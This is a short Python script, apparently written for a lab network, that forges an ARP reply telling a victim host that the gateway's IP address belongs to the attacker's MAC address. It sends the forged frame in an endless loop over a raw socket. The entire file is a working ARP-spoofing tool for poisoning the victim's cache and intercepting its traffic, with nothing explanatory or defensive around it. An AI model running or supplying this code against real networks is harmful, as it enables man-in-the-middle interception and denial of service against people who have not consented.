#!/usr/bin/env python3

import socket

vic_mac = b'\x08\x00\x27\xf1\xe2\x18'
attk_mac = b'\x08\x00\x27\x1f\x30\x76'
arp_code = b'\x08\x06'

#eth: dest-src-prot
ethernet = vic_mac + attk_mac + arp_code

#arp: HW type, prot type, HW-size, prot-size, Opcode (2 for reply),
#sender mac, sender IP (spoofed),target mac (victim),  target IP (victim) 

#HW type
hwt = b'\x00\x01'
#prot type
prot = b'\x08\x00'
#HW size
hws = b'\06'
#prot size
prots = b'\04'
#opcode for reply = 2
opcode  = b'\x00\x02'
#sender mac
sender_mac = b'\x08\x00\x27\x1f\x30\x76'
#sender IP (spoofed)
sender_ip = socket.inet_aton('192.168.178.1')
#target mac (victim)
target_mac = b'\x08\x00\x27\xf1\xe2\x18'
#target ip (victim)
target_ip = socket.inet_aton('192.168.178.26')

arp = hwt + prot + hws + prots + opcode + sender_mac + sender_ip +\
        target_mac + target_ip

#pack a spoofed ARP reply frame
packet = ethernet + arp

#send spoofed ARP reply frame

sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
sock.bind (('eth0',6))

while 1:
    sock.send(packet)

